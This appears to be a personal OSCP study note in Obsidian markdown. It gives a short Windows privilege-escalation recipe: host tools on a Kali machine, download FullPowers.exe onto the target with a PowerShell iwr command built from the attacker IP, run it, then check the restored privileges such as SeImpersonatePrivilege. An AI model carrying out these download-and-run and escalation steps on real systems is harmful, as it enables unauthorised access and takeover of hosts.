```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `powershell -c "iwr -uri http://${KaliIP}/FullPowers.exe -OutFile FullPowers.exe"`;

dv.paragraph("```bash\n" + command + "\n```");
```

```powershell
./FullPowers.exe
```

New privileges should be enabled

```
whoami /priv
```

[[SeImpersonatePrivilege]]